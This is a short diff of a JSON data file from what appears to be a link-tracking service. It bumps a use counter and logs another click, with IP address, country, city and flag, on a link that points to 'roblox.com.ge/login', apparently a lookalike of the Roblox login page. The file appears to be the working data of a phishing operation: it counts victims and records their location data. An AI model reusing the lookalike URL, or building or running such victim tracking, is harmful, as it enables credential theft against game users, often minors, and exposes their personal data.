@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1606,
+    "useCount": 1607,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13011,6 +13011,14 @@
       },
       {
         "timestamp": 1777513737686,
+        "ip": "45.6.164.126",
+        "country": "Brazil",
+        "city": "Salto",
+        "flag": "🇧🇷",
+        "countryCode": "BR"
+      },
+      {
+        "timestamp": 1777513746502,
         "ip": "45.6.164.126",
         "country": "Brazil",
         "city": "Salto",
